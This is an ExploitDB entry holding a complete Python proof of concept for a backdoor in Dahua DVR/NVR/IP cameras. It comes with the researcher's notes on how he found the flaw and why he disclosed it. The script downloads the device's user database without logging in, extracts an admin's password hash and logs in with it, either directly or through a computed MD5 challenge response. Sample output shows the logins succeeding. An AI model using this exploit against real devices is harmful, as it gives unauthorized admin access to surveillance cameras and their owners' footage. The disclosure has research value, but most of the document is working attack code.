{'code': '#!/usr/bin/python2.7\r\n\r\nif False: \'\'\'\r\n\r\n2017-05-03\r\n\r\nPublic rerelease of Dahua Backdoor PoC\r\nhttps://github.com/mcw0/PoC/blob/master/dahua-backdoor-PoC.py\r\n\r\n2017-03-20\r\n\r\nWith my newfound knowledge of vulnerable devices out there with an unbelievable number of more than 1 million Dahua / OEM units, where knowledge comes from a report made by NSFOCUS and my own research on shodan.io.\r\n\r\nWith this knowledge, I will not release the Python PoC to the public as before said of April 5, as it is not necessary when the PoC has already been verified by IPVM and other independent security researchers.\r\n\r\nHowever, I\'m open to share the PoC with serious security researchers if so desired, please e-mail me off list and be clear about who you are so I do not take you for a beggar, which I ignore.\r\n\r\nNSFOCUS report: http://blog.nsfocus.net/dahua-cameras-unauthorized-access-vulnerability-technical-analysis-solution/\r\n\r\n/bashis\r\n\r\n\r\n[STX]\r\n\r\nI\'m speechless, and almost don\'t know what I should write... I (hardly) can\'t believe what I have just found.\r\n\r\nI have just discovered (to what I strongly believe is backdoor) in Dahua DVR/NVR/IPC and possible all their clones.\r\n\r\nSince I am convinced this is a backdoor, I have my own policy to NOT notify the vendor before the community.\r\n(I simply don\'t want to listen on their poor excuses, their tryings to keep me silent for informing the community)\r\n\r\nIn short:\r\nYou can delete/add/change name on the admin users, you change password on the admin users - this backdoor simply don\'t care about that!\r\nIt uses whatever names and passwords you configuring - by simply downloading the full user database and use your own credentials!\r\n\r\nThis is so simple as:\r\n1. Remotely download the full user database with all credentials and permissions\r\n2. Choose whatever admin user, copy the login names and password hashes\r\n3. Use them as source to remotely login to the Dahua devices\r\n\r\nThis is like a damn Hollywood hack, click on one button and you are in...\r\n\r\n\r\nBelow PoC you will find here: https://github.com/mcw0/PoC/dahua-backdoor.py\r\nUpdate:\r\nDahua has requested me to temporally remove the PoC code, will be back here again 5th April. (30 days)\r\n/Sorry, bashis\r\n\r\nPlease have understanding of the quick hack of the PoC, I\'m sure it could be done better.\r\n\r\nHave a nice day\r\n/bashis\r\n\r\n$ ./dahua-backdoor.py --rhost 192.168.5.2\r\n\r\n[*] [Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\r\n\r\n[i] Remote target IP: 192.168.5.2\r\n[i] Remote target PORT: 80\r\n[>] Checking for backdoor version\r\n[<] 200 OK\r\n[!] Generation 2 found\r\n[i] Chosing Admin Login: 888888, PWD hash: 4WzwxXxM\r\n[>] Requesting our session ID\r\n[<] 200 OK\r\n[>] Logging in\r\n[<] 200 OK\r\n{ "id" : 10000, "params" : null, "result" : true, "session" : 100385023 }\r\n\r\n[>] Logging out\r\n[<] 200 OK\r\n\r\n[*] All done...\r\n$\r\n\r\n$ ./dahua-backdoor.py --rhost 192.168.5.3\r\n\r\n[*] [Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\r\n\r\n[i] Remote target IP: 192.168.5.3\r\n[i] Remote target PORT: 80\r\n[>] Checking for backdoor version\r\n[<] 200 OK\r\n[!] Generation 3 Found\r\n[i] Choosing Admin Login: admin, Auth: 27\r\n[>] Requesting our session ID\r\n[<] 200 OK\r\n[i] Downloaded MD5 hash: 94DB0778856B11C0D0F5455CCC0CE074\r\n[i] Random value to encrypt with: 1958557123\r\n[i] Built password: admin:1958557123:94DB0778856B11C0D0F5455CCC0CE074\r\n[i] MD5 generated password: 2A5F4F7E1BB6F0EA6381E4595651A79E\r\n[>] Logging in\r\n[<] 200 OK\r\n{ "id" : 10000, "params" : null, "result" : true, "session" : 1175887285 }\r\n\r\n[>] Logging out\r\n[<] 200 OK\r\n\r\n[*] All done...\r\n$\r\n\r\n[ETX]\r\n\'\'\'\r\n\r\n\r\n#\r\n# Dahua backdoor PoC Generation 2 and 3\r\n# Author: bashis <mcw noemail eu> March 2017\r\n# Credentials: No Credentials needed (Exploited as Anonymous)\r\n# Note: PoC intentionally missing essential details to be direct usable for anything else than login/logout.\r\n#\r\n# Vendor URL: http://www.dahuasecurity.com/\r\n#\r\n# Patched firmware can be downloaded from newly introduced \'Firmware download function\'\r\n# (Don\'t mind the old date stamps, these should all be the hotfixed updates)\r\n# http://www.dahuasecurity.com/download_111.html\r\n# \r\n#\r\n# -[ Facts ]-\r\n#\r\n# 1) Requirements\r\n# 1.1) You need to know what you want to request\r\n# 1.2) You need to know how to request what you want\r\n# - When you know this, remote device will give you what you want, without any complains\r\n# 1.3) You need to know how to process the results of your requests\r\n# 1.4) You need to know how to send your processed results back to remote device\r\n# - When you know this, you will be granted full access to remote device, without any complains\r\n#\r\n# 2) Direct file access\r\n# 2.1) /mnt/mtd/Config/{passwd|Account1} downloadable with /current_config/{passwd|Account1} by HTTP/HTTPS\r\n# 2.2) User database hash in format: <username>:<realm>:<password>\r\n# 2.3) /mnt/mtd are read/writable - so sensitive files could (must!) be somewhere else, protected, and not remotely accessible.\r\n# 2.4) /mnt/mtd/Config contains also of intentionally public accessible files (WebCapConfig and preLanguage)\r\n# 2.5) There is several other files that should (must!) not be remotely accessible either (Config1 for example)\r\n#\r\n# 3) Passing the hash\r\n# 3.1) Generation 1 - Base64 encoded (Not in this PoC, since I don\'t know what I want to request, but I could guess same format as 2.2)\r\n# 3.2) Generation 2 - No processing needed; only to pass on the hash\r\n# 3.3) Generation 3 - New \'improved\' MD5 random hash must be generated with additional details, that we simply requesting from remote\r\n# 3.4) New MD5 random hash has to be generated as: <username>:<random>:[MD5 format as in user database (2.2)] \r\n#\r\n# - Not less than three times, Dahua have been poking around in the file structure and in the relevant functions of the source code\r\n# - Changed file names, structure of user database, added/removed both public and sensitive files.\r\n# - And never once wondered;\r\n# 1. \'Hm, why I\'m allowed to access these newly added files without login request?\'\r\n# 2. \'Hm, I know that file is the user database, can I access that one too without login request?\'\r\n# 3. \'Hm, I know that file is the device config, can I access that one too without login request?\'\r\n# - Really? Are you kidding me?\r\n#\r\n# When you know all above, and have full access to remote device, the whole thing looks so easy, actually way too easy to be true.\r\n#\r\n#\r\n# -[ Most importantly ]-\r\n#\r\n# 1) Undocumented direct access to certain file structures, and used from some of Dahuas own .js to load \'WebCapConfig\' and \'preLanguage\'\r\n# 2) Direct and indirect re-usage of hashes possible, however with MD5 hash \'security improvements\' in Generation 3\r\n# 3) Essential needs for successful login we simply request from remote device and process, no need to guess nor bruteforce anything\r\n# 4) Abnormally wide range of products and firmware versions that share same reliable attack method, to be \'just an vulnerability\'\r\n# - True vulnerability over a wide range products and firmware versions have always some unexpected anomalies, which is expected\r\n# 5) Dahua has lots of debug code compiled into the Firmware that may/normally listening on TCP/6789, although protected by l/p authorization\r\n# - Dahua has been kindly asked to remove all debug code from production firmware, as this access and code do not belong in end user devices\r\n# 6) The admin account \'888888\' is claimed by Dahua to be limited for local login with \'monitor and mouse\' only, and not from remote\r\n# - However, that validation is done locally in users browser by \'loginEx.js\', and has therefore no practical effect\r\n# 7) The \'hotfix\' remediation was done by hardcoding from full access to two intentionally public accessible files (WebCapConfig and preLanguage)\r\n#\r\n#\r\n# -[ Did Dahua confirm the backdoor by mistake? ]-\r\n#\r\n# Don\'t know if you noticed that the \'new\' patches that was pushed out days after my initital post at IPVM,\r\n# they had different old date stamps, and same old date stamps (as on the archives) was on all inside binaries as well.\r\n#\r\n# Screenshots\r\n# https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20Timestamp.png\r\n# https://github.com/mcw0/PoC/blob/master/Dahua%20Wiki%20Firmware%20listing.png\r\n#\r\n# URL\r\n# http://us.dahuasecurity.com/en/us/Security-Bulletin_030617.php\r\n# https://dahuawiki.com/images/Firmware/DVR/Q2.2017/\r\n#\r\n# And, bit interesting, Dahua continued to use old date stamps on newly generated firmware updates/hotfixes\r\n#\r\n# -[ Method of discovery ]-\r\n#\r\n# Researching by dissasembling of Dahuas main binaries \'Challenge\' / \'Sonia\'\r\n# What got me curios, was abnormally empty inside of the image I was initally checking, and of course the big binary \'Challenge\'\r\n# What got me on track, was the lack of references to sensitive files\r\n# Missing user database and Config in the archives, only a unused and read-only /etc/passwd was found\r\n# Noticed that sensitive files was generated by the binary at startup\r\n# Noticed checkings after sensitive files in different directories, to use \'defaults\' as last resource\r\n# Noticed the mix of intentionally public files and sensitive files in same directory\r\n# Reading of the .htm and .js that was found in the image\r\n# ...etc.\r\n#\r\n#\r\n# -[ My Full Disclosure Policy ]-\r\n#\r\n# Normal vulnerabilites: I collect enough information about my findings and trying to notify the vendor to have coordinated disclosure\r\n# Backdoors: If/when they are intended, the vendors wants to hide/keep them (of course), what would you suggest? Notify the vendor or Full Disclosure?\r\n# Proof of claim: Screenshots or some Youtube video would not proof anything, so the claim couldn\'t be posted without real hard cold facts\r\n# - Professionals within the CCTV industry needed to know, and the only place I knew were many of them, was at IPVM, and therefore the first post was made there.\r\n#\r\n#\r\n# -[ Next Generation Backdoors ]-\r\n#\r\n# That is in my opinion vendors P2P Cloud solutions.\r\n#\r\n# With P2P, these kind of backdoor implementations as shown in this PoC will then not be needed,\r\n# since with P2P you practically giving away your credentials and addresses to your devices!\r\n# And the connection to P2P, your devices initiates and keeps open. (For me, it is similar to reverse shell)\r\n#\r\n#\r\n# -[ Hat\'s ]-\r\n#\r\n# I don\'t wear hats, I wear caps... (when it\'s cold)\r\n#\r\n#\r\n# -[ Function of this PoC code ]-\r\n#\r\n# 1) Check and dump the remote user database (Generation 2 or 3)\r\n# 2) Find first availible admin user and extract their login/pwd hash\r\n# 3) Request session ID, compute new hash if needed (Generation 3)\r\n# 4) Login and logout to/from remote device\r\n#\r\n#\r\n# -[ Credits ]-\r\n#\r\n# binwalk (https://github.com/devttys0/binwalk)\r\n# - Nothing easy could been done without binwalk, awesome tool. Thanks!\r\n#\r\n# IPVM (https://ipvm.com/)\r\n# - For pickup of the claim and to make PoC report, so this Python PoC could be taken down.\r\n#\r\n# Full Disclosure (http://seclists.org/fulldisclosure/)\r\n# - For existing, without your e-mail list, sensitive stuff would be quite difficult to uncover.\r\n# - Fyodor, thanks again.\r\n#\r\n# And, big thanks to all authors for all other stuff and tools that\'s needed to successfully execute research within binaries\r\n# - To many for naming.\r\n#\r\n# Have a nice day\r\n# /bashis\r\n#\r\n\r\nimport string\r\nimport sys\r\nimport socket\r\nimport argparse\r\nimport urllib, urllib2, httplib\r\nimport base64\r\nimport ssl\r\nimport json\r\nimport commentjson # pip install commentjson\r\nimport hashlib\r\n\r\nclass HTTPconnect:\r\n\r\n\tdef __init__(self, host, proto, verbose, creds, Raw):\r\n\t\tself.host = host\r\n\t\tself.proto = proto\r\n\t\tself.verbose = verbose\r\n\t\tself.credentials = creds\r\n\t\tself.Raw = Raw\r\n\t\r\n\tdef Send(self, uri, query_headers, query_data,ID):\r\n\t\tself.uri = uri\r\n\t\tself.query_headers = query_headers\r\n\t\tself.query_data = query_data\r\n\t\tself.ID = ID\r\n\r\n\t\t# Connect-timeout in seconds\r\n\t\ttimeout = 5\r\n\t\tsocket.setdefaulttimeout(timeout)\r\n\r\n\t\turl = \'{}://{}{}\'.format(self.proto, self.host, self.uri)\r\n\r\n\t\tif self.verbose:\r\n\t\t\tprint "[Verbose] Sending:", url\r\n\r\n\t\tif self.proto == \'https\':\r\n\t\t\tif hasattr(ssl, \'_create_unverified_context\'):\r\n\t\t\t\tprint "[i] Creating SSL Unverified Context"\r\n\t\t\t\tssl._create_default_https_context = ssl._create_unverified_context\r\n\r\n\t\tif self.credentials:\r\n\t\t\tBasic_Auth = self.credentials.split(\':\')\r\n\t\t\tif self.verbose:\r\n\t\t\t\tprint "[Verbose] User:",Basic_Auth[0],"Password:",Basic_Auth[1]\r\n\t\t\ttry:\r\n\t\t\t\tpwd_mgr = urllib2.HTTPPasswordMgrWithDefaultRealm()\r\n\t\t\t\tpwd_mgr.add_password(None, url, Basic_Auth[0], Basic_Auth[1])\r\n\t\t\t\tauth_handler = urllib2.HTTPBasicAuthHandler(pwd_mgr)\r\n\t\t\t\topener = urllib2.build_opener(auth_handler)\r\n\t\t\t\turllib2.install_opener(opener)\r\n\t\t\texcept Exception as e:\r\n\t\t\t\tprint "[!] Basic Auth Error:",e\r\n\t\t\t\tsys.exit(1)\r\n\r\n\t\tif self.query_data:\r\n\t\t\trequest = urllib2.Request(url, data=json.dumps(self.query_data), headers=self.query_headers)\r\n\t\telse:\r\n\t\t\trequest = urllib2.Request(url, None, headers=self.query_headers)\r\n\t\tresponse = urllib2.urlopen(request)\r\n#\t\tprint response\r\n\t\tif response:\r\n\t\t\tprint "[<] {} OK".format(response.code)\r\n\r\n\t\tif self.Raw:\r\n\t\t\treturn response\r\n\t\telse:\r\n\t\t\thtml = response.read()\r\n\t\t\treturn html\r\n\r\n\r\nclass Dahua_Backdoor:\r\n\r\n\tdef __init__(self, rhost, proto, verbose, creds, Raw):\r\n\t\tself.rhost = rhost\r\n\t\tself.proto = proto\r\n\t\tself.verbose = verbose\r\n\t\tself.credentials = creds\r\n\t\tself.Raw = Raw\r\n\r\n\t#\r\n\t# Generation 2\r\n\t#\r\n\tdef Gen2(self,response,headers):\r\n\t\tself.response = response\r\n\t\tself.headers = headers\r\n\r\n\t\thtml = self.response.readlines()\r\n\t\tif self.verbose:\r\n\t\t\tfor lines in html:\r\n\t\t\t\tprint "{}".format(lines)\r\n\t\t#\r\n\t\t# Check for first availible admin user\r\n\t\t#\r\n\t\tfor line in html:\r\n\t\t\tif line[0] == "#" or line[0] == "\\n":\r\n\t\t\t\tcontinue\r\n\t\t\tline = line.split(\':\')[0:25]\r\n\t\t\tif line[3] == \'1\':\t\t# Check if user is in admin group\r\n\t\t\t\tUSER_NAME = line[1]\t# Save login name\r\n\t\t\t\tPWDDB_HASH = line[2]# Save hash\r\n\t\t\t\tprint "[i] Choosing Admin Login [{}]: {}, PWD hash: {}".format(line[0],line[1],line[2])\r\n\t\t\t\tbreak\r\n\r\n\t\t#\r\n\t\t# Login 1\r\n\t\t#\r\n\t\tprint "[>] Requesting our session ID"\r\n\t\tquery_args = {"method":"global.login",\r\n\t\t\t"params":{\r\n\t\t\t\t"userName":USER_NAME,\r\n\t\t\t\t"password":"",\r\n\t\t\t\t"clientType":"Web3.0"},\r\n\t\t\t"id":10000}\r\n\r\n\t\tURI = \'/RPC2_Login\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)\r\n\r\n\t\tjson_obj = json.load(response)\r\n\t\tif self.verbose:\r\n\t\t\tprint json.dumps(json_obj,sort_keys=True,indent=4, separators=(\',\', \': \'))\r\n\r\n\t\t#\r\n\t\t# Login 2\r\n\t\t#\r\n\t\tprint "[>] Logging in"\r\n\r\n\t\tquery_args = {"method":"global.login",\r\n\t\t\t"session":json_obj[\'session\'],\r\n\t\t\t"params":{\r\n\t\t\t\t"userName":USER_NAME,\r\n\t\t\t\t"password":PWDDB_HASH,\r\n\t\t\t\t"clientType":"Web3.0",\r\n\t\t\t\t"authorityType":"OldDigest"},\r\n\t\t\t"id":10000}\r\n\r\n\t\tURI = \'/RPC2_Login\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj[\'session\'])\r\n\t\tprint response.read()\r\n\r\n\t\t#\r\n\t\t# Wrong username/password\r\n\t\t# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1997483520 }\r\n\t\t# { "error" : { "code" : 268632070, "message" : "Component error: user\'s name not valid!" }, "id" : 10000, "result" : false, "session" : 1997734656 }\r\n\t\t#\r\n\t\t# Successfull login\r\n\t\t# { "id" : 10000, "params" : null, "result" : true, "session" : 1626533888 }\r\n\t\t# \r\n\r\n\t\t#\r\n\t\t# Logout\r\n\t\t#\r\n\t\tprint "[>] Logging out"\r\n\t\tquery_args = {"method":"global.logout",\r\n\t\t\t"params":"null",\r\n\t\t\t"session":json_obj[\'session\'],\r\n\t\t\t"id":10001}\r\n\r\n\t\tURI = \'/RPC2\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)\r\n\t\treturn response\r\n\r\n\t#\r\n\t# Generation 3\r\n\t#\r\n\tdef Gen3(self,response,headers):\r\n\t\tself.response = response\r\n\t\tself.headers = headers\r\n\r\n\t\tjson_obj = commentjson.load(self.response)\r\n\t\tif self.verbose:\r\n\t\t\tprint json.dumps(json_obj,sort_keys=True,indent=4, separators=(\',\', \': \'))\r\n\r\n\t\t#\r\n\t\t# Check for first availible admin user\r\n\t\t#\r\n\t\tfor who in json_obj[json_obj.keys()[0]]:\r\n\t\t\tif who[\'Group\'] == \'admin\':\t\t\t# Check if user is in admin group\r\n\t\t\t\tUSER_NAME = who[\'Name\']\t\t\t# Save login name\r\n\t\t\t\tPWDDB_HASH = who[\'Password\']\t# Save hash\r\n\t\t\t\tprint "[i] Choosing Admin Login: {}".format(who[\'Name\'])\r\n\t\t\t\tbreak\r\n\t\t#\r\n\t\t# Request login\r\n\t\t#\r\n\t\tprint "[>] Requesting our session ID"\r\n\t\tquery_args = {"method":"global.login",\r\n\t\t\t"params":{\r\n\t\t\t\t"userName":USER_NAME,\r\n\t\t\t\t"password":"",\r\n\t\t\t\t"clientType":"Web3.0"},\r\n\t\t\t"id":10000}\r\n\r\n\t\tURI = \'/RPC2_Login\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)\r\n\r\n\t\tjson_obj = json.load(response)\r\n\t\tif self.verbose:\r\n\t\t\tprint json.dumps(json_obj,sort_keys=True,indent=4, separators=(\',\', \': \'))\r\n\t\t#\r\n\t\t# Generate login MD5 hash with all required info we have downloaded\r\n\t\t#\r\n\t\tRANDOM = json_obj[\'params\'][\'random\']\r\n\t\tPASS = \'\'+ USER_NAME +\':\' + RANDOM + \':\' + PWDDB_HASH + \'\'\r\n\t\tRANDOM_HASH = hashlib.md5(PASS).hexdigest().upper()\r\n\r\n\t\tprint "[i] Downloaded MD5 hash:",PWDDB_HASH\r\n\t\tprint "[i] Random value to encrypt with:",RANDOM\r\n\t\tprint "[i] Built password:",PASS\r\n\t\tprint "[i] MD5 generated password:",RANDOM_HASH\r\n\r\n\t\t#\r\n\t\t# Login\r\n\t\t#\r\n\t\tprint "[>] Logging in"\r\n\r\n\t\tquery_args = {"method":"global.login",\r\n\t\t\t"session":json_obj[\'session\'],\r\n\t\t\t"params":{\r\n\t\t\t\t"userName":USER_NAME,\r\n\t\t\t\t"password":RANDOM_HASH,\r\n\t\t\t\t"clientType":"Web3.0",\r\n\t\t\t\t"authorityType":"Default"},\r\n\t\t\t"id":10000}\r\n\r\n\t\tURI = \'/RPC2_Login\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,json_obj[\'session\'])\r\n\t\tprint response.read()\r\n\r\n\t\t# Wrong username/password\r\n\t\t# { "error" : { "code" : 268632071, "message" : "Component error: password not valid!" }, "id" : 10000, "result" : false, "session" : 1156538295 }\r\n\t\t# { "error" : { "code" : 268632070, "message" : "Component error: user\'s name not valid!" }, "id" : 10000, "result" : false, "session" : 1175812023 }\r\n\t\t#\r\n\t\t# Successfull login\r\n\t\t# { "id" : 10000, "params" : null, "result" : true, "session" : 1175746743 }\r\n\t\t#\r\n\r\n\t\t#\r\n\t\t# Logout\r\n\t\t#\r\n\t\tprint "[>] Logging out"\r\n\t\tquery_args = {"method":"global.logout",\r\n\t\t\t"params":"null",\r\n\t\t\t"session":json_obj[\'session\'],\r\n\t\t\t"id":10001}\r\n\r\n\t\tURI = \'/RPC2\'\r\n\t\tresponse = HTTPconnect(self.rhost,self.proto,self.verbose,self.credentials,self.Raw).Send(URI,headers,query_args,None)\r\n\t\treturn response\r\n\r\n#\r\n# Validate correctness of HOST, IP and PORT\r\n#\r\nclass Validate:\r\n\r\n\tdef __init__(self,verbose):\r\n\t\tself.verbose = verbose\r\n\r\n\t# Check if IP is valid\r\n\tdef CheckIP(self,IP):\r\n\t\tself.IP = IP\r\n\r\n\t\tip = self.IP.split(\'.\')\r\n\t\tif len(ip) != 4:\r\n\t\t\treturn False\r\n\t\tfor tmp in ip:\r\n\t\t\tif not tmp.isdigit():\r\n\t\t\t\treturn False\r\n\t\ti = int(tmp)\r\n\t\tif i < 0 or i > 255:\r\n\t\t\treturn False\r\n\t\treturn True\r\n\r\n\t# Check if PORT is valid\r\n\tdef Port(self,PORT):\r\n\t\tself.PORT = PORT\r\n\r\n\t\tif int(self.PORT) < 1 or int(self.PORT) > 65535:\r\n\t\t\treturn False\r\n\t\telse:\r\n\t\t\treturn True\r\n\r\n\t# Check if HOST is valid\r\n\tdef Host(self,HOST):\r\n\t\tself.HOST = HOST\r\n\r\n\t\ttry:\r\n\t\t\t# Check valid IP\r\n\t\t\tsocket.inet_aton(self.HOST) # Will generate exeption if we try with DNS or invalid IP\r\n\t\t\t# Now we check if it is correct typed IP\r\n\t\t\tif self.CheckIP(self.HOST):\r\n\t\t\t\treturn self.HOST\r\n\t\t\telse:\r\n\t\t\t\treturn False\r\n\t\texcept socket.error as e:\r\n\t\t\t# Else check valid DNS name, and use the IP address\r\n\t\t\ttry:\r\n\t\t\t\tself.HOST = socket.gethostbyname(self.HOST)\r\n\t\t\t\treturn self.HOST\r\n\t\t\texcept socket.error as e:\r\n\t\t\t\treturn False\r\n\r\n\r\n\r\nif __name__ == \'__main__\':\r\n\r\n#\r\n# Help, info and pre-defined values\r\n#\t\r\n\tINFO =  \'[Dahua backdoor Generation 2 & 3 (2017 bashis <mcw noemail eu>)]\\n\'\r\n\tHTTP = "http"\r\n\tHTTPS = "https"\r\n\tproto = HTTP\r\n\tverbose = False\r\n\traw_request = True\r\n\trhost = \'192.168.5.2\'\t# Default Remote HOST\r\n\trport = \'80\'\t\t\t# Default Remote PORT\r\n\tcreds = False\t\t\t# creds = \'user:pass\'\r\n\r\n\r\n#\r\n# Try to parse all arguments\r\n#\r\n\ttry:\r\n\t\targ_parser = argparse.ArgumentParser(\r\n\t\tprog=sys.argv[0],\r\n\t\t\t\tdescription=(\'[*] \'+ INFO +\' [*]\'))\r\n\t\targ_parser.add_argument(\'--rhost\', required=False, help=\'Remote Target Address (IP/FQDN) [Default: \'+ rhost +\']\')\r\n\t\targ_parser.add_argument(\'--rport\', required=False, help=\'Remote Target HTTP/HTTPS Port [Default: \'+ rport +\']\')\r\n\t\tif creds:\r\n\t\t\targ_parser.add_argument(\'--auth\', required=False, help=\'Basic Authentication [Default: \'+ creds + \']\')\r\n\t\targ_parser.add_argument(\'--https\', required=False, default=False, action=\'store_true\', help=\'Use HTTPS for remote connection [Default: HTTP]\')\r\n\t\targ_parser.add_argument(\'-v\',\'--verbose\', required=False, default=False, action=\'store_true\', help=\'Verbose mode [Default: False]\')\r\n\t\targs = arg_parser.parse_args()\r\n\texcept Exception as e:\r\n\t\tprint INFO,"\\nError: %s\\n" % str(e)\r\n\t\tsys.exit(1)\r\n\r\n\t# We want at least one argument, so print out help\r\n\tif len(sys.argv) == 1:\r\n\t\targ_parser.parse_args([\'-h\'])\r\n\r\n\tprint "\\n[*]",INFO\r\n\r\n\tif args.verbose:\r\n\t\tverbose = args.verbose\r\n#\r\n# Check validity, update if needed, of provided options\r\n#\r\n\tif args.https:\r\n\t\tproto = HTTPS\r\n\t\tif not args.rport:\r\n\t\t\trport = \'443\'\r\n\r\n\tif creds and args.auth:\r\n\t\tcreds = args.auth\r\n\r\n\tif args.rport:\r\n\t\trport = args.rport\r\n\r\n\tif args.rhost:\r\n\t\trhost = args.rhost\r\n\r\n\t# Check if RPORT is valid\r\n\tif not Validate(verbose).Port(rport):\r\n\t\tprint "[!] Invalid RPORT - Choose between 1 and 65535"\r\n\t\tsys.exit(1)\r\n\r\n\t# Check if RHOST is valid IP or FQDN, get IP back\r\n\trhost = Validate(verbose).Host(rhost)\r\n\tif not rhost:\r\n\t\tprint "[!] Invalid RHOST"\r\n\t\tsys.exit(1)\r\n\r\n#\r\n# Validation done, start print out stuff to the user\r\n#\r\n\tif args.https:\r\n\t\tprint "[i] HTTPS / SSL Mode Selected"\r\n\tprint "[i] Remote target IP:",rhost\r\n\tprint "[i] Remote target PORT:",rport\r\n\r\n\trhost = rhost + \':\' + rport\r\n\r\n\theaders = {\r\n\t\t\'X-Requested-With\'\t:\t\'XMLHttpRequest\',\r\n\t\t\'X-Request\'\t:\t\'JSON\',\r\n\t\t\'User-Agent\':\'Dahua/2.0; Dahua/3.0\'\r\n\t\t}\r\n\r\n\t#\r\n\t# Try to find /current_config/passwd user database (Generation 2)\r\n\t#\r\n\ttry:\r\n\t\tprint "[>] Checking for backdoor version"\r\n\t\tURI = "/current_config/passwd"\r\n\t\tresponse = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)\r\n\t\tprint "[!] Generation 2 found"\r\n\t\treponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen2(response,headers)\r\n\texcept urllib2.HTTPError as e:\r\n\t\t#\r\n\t\t# If not, try to find /current_config/Account1 user database (Generation 3)\r\n\t\t#\r\n\t\tif e.code == 404:\r\n\t\t\ttry:\r\n\t\t\t\tURI = \'/current_config/Account1\'\r\n\t\t\t\tresponse = HTTPconnect(rhost,proto,verbose,creds,raw_request).Send(URI,headers,None,None)\r\n\t\t\t\tprint "[!] Generation 3 Found"\r\n\t\t\t\tresponse = Dahua_Backdoor(rhost,proto,verbose,creds,raw_request).Gen3(response,headers)\r\n\t\t\texcept urllib2.HTTPError as e:\r\n\t\t\t\tif e.code == 404:\r\n\t\t\t\t\tprint "[!] Patched or not Dahua device! ({})".format(e.code)\r\n\t\t\t\t\tsys.exit(1)\r\n\t\t\t\telse:\r\n\t\t\t\t\tprint "Error Code: {}".format(e.code)\r\n\texcept Exception as e:\r\n\t\tprint "[!] Detect of target failed ({})".format(e)\r\n\t\tsys.exit(1)\r\n\r\n\tprint "\\n[*] All done...\\n"\r\n\tsys.exit(0)', 'description': 'Dahua Generation 2/3 - Backdoor Access', 'author': 'bashis', '_id': 44002, 'source': 'ExploitDB', 'platform': 'multiple', 'date': '2017-05-02T00:00:00+00:00', 'cve': [], 'type': 'remote', 'port': 0}
